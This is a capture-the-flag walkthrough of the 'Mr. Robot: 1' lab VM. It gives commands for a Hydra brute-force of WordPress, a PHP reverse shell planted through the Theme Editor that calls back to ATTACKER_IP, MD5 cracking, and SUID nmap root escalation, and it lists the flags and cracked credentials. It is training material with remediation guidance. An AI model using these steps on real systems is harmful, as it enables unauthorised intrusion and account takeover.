# Mr. Robot: 1 — Hello, Friend

Hello, friend. Hello, friend? That's lame. Maybe I should give you a name. How about fsociety?

This is the one, dude. Mr. Robot: 1 is the box that turned countless people into pentesters. Inspired by the USA Network TV show, it puts you in Elliot Alderson's seat and asks: can you hack through three keys? No cap, this is one of the most iconic CTF VMs ever built. The WordPress brute-force, the fsocity.dic wordlist, elliot's all-lowercase password, the robot MD5 hash, the SUID nmap shell — every step feels like a scene from the show. Absolute legend status. fr fr.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | Mr. Robot: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/mr-robot-1,151/ |
| **Techniques** | robots.txt enumeration, fsocity.dic deduplication, WPScan user enumeration, Hydra WordPress brute-force, WordPress Theme Editor PHP RCE, MD5 hash cracking, SUID nmap interactive shell escalation |
| **CVEs** | CWE-521 (Weak Password Requirements — elliot's weak WordPress password), CWE-732 (Incorrect Permission Assignment — SUID nmap), CWE-916 (Use of Password Hash with Insufficient Computational Effort — MD5 for robot's password) |
| **APT Groups** | FIN7: routinely targets WordPress admin panels with credential stuffing and brute-force as initial access; APT41: exploits CMS admin theme/plugin editors for web shell deployment in initial access operations |

---

## Attack Summary

```
netdiscover → nmap → port 80 (HTTP/WordPress) + 443 (HTTPS) + 22 (closed)
  → browse port 80 → Mr. Robot themed interactive terminal
  → robots.txt → key-1-of-3.txt + fsocity.dic
  → Key 1: 073403c8a58a1f80d943455fb30724b9
  → sort -u fsocity.dic → 11,451 unique entries (from 858,160)
  → wpscan --enumerate u → user: elliot
  → hydra -l elliot -P fsocity_uniq.dic → elliot:ER28-0652
  → wp-admin login → Appearance → Editor → 404.php → PHP reverse shell
  → nc -lvnp 4444 → shell as daemon
  → /home/robot/password.raw-md5 → robot:c3fcd3d76192e4007dfb496cca67e13b
  → hashcat -m 0 → abcdefghijklmnopqrstuvwxyz
  → python pty → su robot → Key 2: 822c73956184f694993bebb3eb32f0b9
  → find SUID → /usr/local/bin/nmap (version 3.81)
  → nmap --interactive → !sh → uid=0(root)
  → Key 3: 04787ddef27c3dee1ee161b21670b4e4
```

---

## Methodology

1. Host discovery and full port scan
2. Web enumeration: discover WordPress installation and robots.txt
3. Download fsocity.dic wordlist from robots.txt; capture Key 1
4. Deduplicate wordlist to reduce brute-force time
5. Enumerate WordPress users with WPScan
6. Brute-force elliot's WordPress password with Hydra
7. Upload PHP reverse shell via WordPress Theme Editor
8. Stabilize shell; read robot's MD5 password hash; capture Key 2
9. Privilege escalation via SUID nmap --interactive; capture Key 3

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
# Target: 192.168.56.X

nmap -sV -sC -p- 192.168.56.X
```

```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
```

SSH is closed. HTTP and HTTPS run on Apache. Both serve the same WordPress installation. The interactive Mr. Robot-themed terminal on the landing page is purely cosmetic.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration and robots.txt

Browse to `http://TARGET_IP`. The interactive fake terminal lets you run commands like `prepare`, `fsociety`, `inform`, `question`, `wakeup`, and `join`. All cosmetic. None lead to anything useful.

Check robots.txt:

```bash
curl http://TARGET_IP/robots.txt
```

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Both files are directly accessible. This is intentional — the machine teaches robots.txt enumeration as a foundational step.

**Key 1 captured:**

```bash
curl http://TARGET_IP/key-1-of-3.txt
# 073403c8a58a1f80d943455fb30724b9
```

**Real-world note:** robots.txt is a public document meant for search engine crawlers. Listing sensitive paths (admin panels, backup directories, credential files) in robots.txt actually advertises them to attackers. This is a consistent misconfiguration finding in web application assessments.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 3 — Download and Deduplicate the Wordlist

```bash
wget http://TARGET_IP/fsocity.dic
wc -l fsocity.dic
# 858,160 lines — massive, mostly duplicates
```

Deduplication is critical here. Running Hydra against 858,160 entries would take hours. After deduplication:

```bash
sort -u fsocity.dic > fsocity_uniq.dic
wc -l fsocity_uniq.dic
# 11,451 unique entries
```

That is a 98.7% reduction. The brute-force now takes minutes instead of days.

**Why this matters:** Custom wordlists derived from target context (company name, product names, domain keywords) dramatically outperform generic wordlists. The fsocity.dic is a context-specific wordlist derived from the Mr. Robot universe. In real engagements, generating a CUPP (Common User Passwords Profiler) wordlist from the target's social media profile is equivalent.

**MITRE ATT&CK:** T1110.003 — Brute Force: Password Spraying (optimized)

---

## Step 4 — Enumerate WordPress Users

```bash
wpscan --url http://TARGET_IP --enumerate u
# Alternative: wpscan --url http://TARGET_IP -e u --no-update
```

WPScan identifies a valid WordPress user: **elliot**

WordPress user enumeration works because the platform returns different HTTP responses for valid vs. invalid usernames on the login page (`/?author=1`, login errors, XML-RPC). By default, WordPress leaks usernames freely.

**MITRE ATT&CK:** T1087.001 — Account Discovery: Local Account

---

## Step 5 — Brute-Force WordPress Login

```bash
hydra -l elliot -P fsocity_uniq.dic TARGET_IP http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR" \
  -t 30 -v
```

**Alternative with WPScan:**

```bash
wpscan --url http://TARGET_IP -U elliot -P fsocity_uniq.dic
```

Credential found: **elliot : ER28-0652**

`ER28-0652` is Elliot Alderson's employee ID from the show. The password is themed around the VM's narrative. In real engagements, themed passwords derived from company culture, products, or public information are extremely common.

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

---

## Step 6 — PHP Reverse Shell via WordPress Theme Editor

Log in to `http://TARGET_IP/wp-admin` with `elliot:ER28-0652`.

Navigate to: **Appearance → Editor → 404 Template (404.php)**

Replace the entire 404.php content with PentestMonkey's PHP reverse shell. Set the attacker IP and port:

```php
$ip = 'ATTACKER_IP';
$port = 4444;
```

Start the netcat listener:

```bash
nc -lvnp 4444
```

Trigger the shell by visiting a non-existent page to invoke the 404 template:

```bash
curl http://TARGET_IP/wp-content/themes/twentyfifteen/404.php
# or: curl http://TARGET_IP/nonexistent-page-12345
```

Reverse shell received as `daemon`.

**Why this works:** WordPress admin users can edit theme PHP files directly through the dashboard. Editing 404.php and visiting any non-existent URL triggers the modified template. This is a well-known WordPress post-exploitation technique documented since 2012.

**Alternative:** Instead of editing a theme file, upload a plugin containing a PHP webshell: Plugins → Add New → Upload Plugin → malicious-plugin.zip.

**MITRE ATT&CK:** T1505.001 — Server Software Component: SQL Stored Procedures (analogous: web shell via CMS file editor); T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 7 — Shell Stabilization and Key 2

Stabilize the raw netcat shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Press Enter twice
```

Enumerate the home directory:

```bash
ls -la /home/robot/
# key-2-of-3.txt  password.raw-md5
```

The key file is not readable as `daemon`. The MD5 hash file is world-readable:

```bash
cat /home/robot/password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

Crack the MD5 hash:

```bash
# On attacker machine:
hashcat -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt
# Result: abcdefghijklmnopqrstuvwxyz
```

```bash
# Back on the victim shell:
su robot
# Password: abcdefghijklmnopqrstuvwxyz

cat /home/robot/key-2-of-3.txt
# 822c73956184f694993bebb3eb32f0b9
```

**Why MD5 is broken for passwords:** MD5 is a fast hash designed for data integrity, not password storage. A GPU can test billions of MD5 hashes per second. The entire rockyou.txt wordlist (14 million entries) cracks in seconds. Use bcrypt, scrypt, or Argon2 for password hashing.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1110.002 — Brute Force: Password Cracking

---

## Step 8 — Privilege Escalation via SUID nmap

Search for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Output includes `/usr/local/bin/nmap`. Check the version:

```bash
nmap --version
# nmap version 3.81
```

nmap versions 2.02 through 5.21 support `--interactive` mode, which spawns a shell. When nmap has the SUID bit set and is owned by root, the spawned shell inherits root privileges.

```bash
nmap --interactive
nmap> !sh

id
# uid=1000(robot) euid=0(root)

cat /root/key-3-of-3.txt
# 04787ddef27c3dee1ee161b21670b4e4
```

Root achieved. Hello, friend. (❍ᴥ❍ʋ)

**Real-world note:** GTFOBins (gtfobins.github.io) catalogs privilege escalation techniques for over 200 Unix binaries. Any binary with the SUID bit that can spawn a shell or execute arbitrary commands becomes a trivial root vector. Always check GTFOBins for every SUID binary found.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Key 1 | `073403c8a58a1f80d943455fb30724b9` | /key-1-of-3.txt (from robots.txt) | Objective 1 |
| Credential | elliot:ER28-0652 | Hydra brute-force against /wp-login.php | WordPress admin login |
| MD5 hash | c3fcd3d76192e4007dfb496cca67e13b | /home/robot/password.raw-md5 | Hash cracking |
| Credential | robot:abcdefghijklmnopqrstuvwxyz | MD5 cracked via hashcat | su to robot user |
| Key 2 | `822c73956184f694993bebb3eb32f0b9` | /home/robot/key-2-of-3.txt | Objective 2 |
| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` | /root/key-3-of-3.txt | Objective 3 |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | robots.txt discloses sensitive files | robots.txt is public; listing a path in it is advertising it to attackers | Never put sensitive paths in robots.txt; use server-side access controls |
| 2 | WordPress user enumeration (author parameter, login errors) | WordPress exposes usernames by default; combined with a wordlist, this enables targeted brute-force | Add `define('WP_SITEURL', ...)` protection; use fail2ban or limit login attempts plugin |
| 3 | Wordlist deduplication reduces brute-force time by 98.7% | Custom targeted wordlists massively outperform generic ones; quality beats quantity | Generate context-specific wordlists; deduplicate before running brute-force |
| 4 | WordPress Theme Editor allows arbitrary PHP execution | Any WordPress admin can deploy malicious PHP code via the Theme Editor without uploading a file | Disable the Theme Editor: `define('DISALLOW_FILE_EDIT', true)` in wp-config.php |
| 5 | MD5 is not a password hash | MD5 has no computational cost; modern GPUs crack MD5 hashes at billions per second | Use bcrypt (cost factor 12+), scrypt, or Argon2 for password storage |
| 6 | SUID nmap --interactive spawns shell as root | Any SUID binary that can execute arbitrary code or spawn a shell is equivalent to a root backdoor | Audit all SUID binaries; remove SUID from non-essential tools; nmap never needs SUID in production |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery (robots.txt) | T1083 |
| Credential Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Credential Access | Credential Access | Account Discovery: Local Account (WPScan) | T1087.001 |
| Initial Access | Initial Access | Exploit Public-Facing Application (WP admin) | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Credential Access | Credential Access | Credentials in Files (MD5 hash file) | T1552.001 |
| Credential Access | Credential Access | Brute Force: Password Cracking (hashcat MD5) | T1110.002 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid (nmap SUID) | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove sensitive paths from robots.txt**: never list files you don't want accessed; use server-side access controls instead
2. **Disable WordPress user enumeration**: add `wp_redirect()` protection on author pages; return 404 for invalid usernames on the login page; install the Stop User Enumeration plugin
3. **Disable WordPress Theme/Plugin Editor**: add `define('DISALLOW_FILE_EDIT', true);` to wp-config.php; this prevents admin-level PHP code execution via the dashboard
4. **Enforce strong WordPress passwords**: use WordPress's built-in password strength requirements; disable XML-RPC if not needed: `add_filter('xmlrpc_enabled', '__return_false')`
5. **Replace MD5 with bcrypt for password hashing**: WordPress natively uses phpass (bcrypt-based); the issue here was storing a raw MD5 outside the WordPress password system
6. **Remove SUID from nmap**: `chmod u-s /usr/local/bin/nmap`; nmap requires elevated privileges only for raw socket operations (SYN scan), which is better handled via capabilities: `setcap cap_net_raw+ep /usr/local/bin/nmap`
7. **Rate-limit WordPress login attempts**: implement fail2ban rules or the Limit Login Attempts Reloaded plugin to block brute-force attacks

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening: disable Theme Editor; disable XML-RPC; disable user enumeration
- **D3-OAM** — Operating System Administrative Management: remove SUID from nmap; use capabilities instead
- **D3-NTF** — Network Traffic Filtering: rate-limit wp-login.php requests via WAF or nginx limit_req

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory WordPress installations; catalog SUID binaries; document exposed robots.txt paths |
| Protect | Access Control | Disable Theme Editor; enforce strong password policy; remove nmap SUID |
| Protect | Data Security | Replace raw MD5 with bcrypt for all password storage |
| Detect | Anomalies and Events | Alert on wp-login.php brute-force attempts; alert on Theme Editor file modifications |
| Respond | Response Planning | Remove webshells; rotate WordPress admin credentials; remove compromised themes |
| Recover | Recovery Planning | Restore WordPress from clean backup; audit all admin accounts and installed plugins |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-7 | Unsuccessful Logon Attempts | Rate-limit and lockout after repeated failed WordPress logins |
| AC-6 | Least Privilege | Remove nmap SUID; restrict Theme Editor access |
| IA-5(1) | Authenticator Management: Password Policies | Enforce minimum password length and complexity in WordPress |
| IA-7 | Cryptographic Module Authentication | Replace MD5 with bcrypt/Argon2 for password storage |
| CM-7 | Least Functionality | Disable XML-RPC; disable Theme Editor; remove development artifacts |
| SC-28 | Protection of Information at Rest | Do not store password hashes in world-readable files |

### CISA KEV

WordPress exploitation via admin panel code execution (CVE-2019-8942, CVE-2019-8943, and others) appears in the CISA KEV catalog. CISA AA22-074A notes that threat actors frequently target WordPress admin credentials via brute-force and credential stuffing as a first-stage attack. Organizations running WordPress should implement multi-factor authentication on wp-admin and rate-limit login attempts as immediate priorities.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments (WordPress hardening) | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges (remove SUID nmap; disable Theme Editor) | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

---

## Final Thoughts

Mr. Robot: 1 is a cultural artifact as much as a CTF. It teaches enumeration discipline (robots.txt, user enumeration, wordlist optimization), authentication attacks (brute-force with targeted wordlist), web exploitation (Theme Editor as code execution surface), credential cracking (MD5), and SUID escalation — all wrapped in a narrative that makes every step feel like a scene from the show.

The fsocity.dic deduplication lesson is genuinely important: 858,160 entries reduced to 11,451 by removing duplicates. That is the kind of optimization that turns a 12-hour brute-force into a 3-minute one. It is a detail that matters in real engagements.

This is the box that defined a generation of CTF players. If you have not run it, you need to. If you have, you know exactly why it earned legendary status.

Hello, friend. gg.

Thanks guys!! (❍ᴥ❍ʋ)
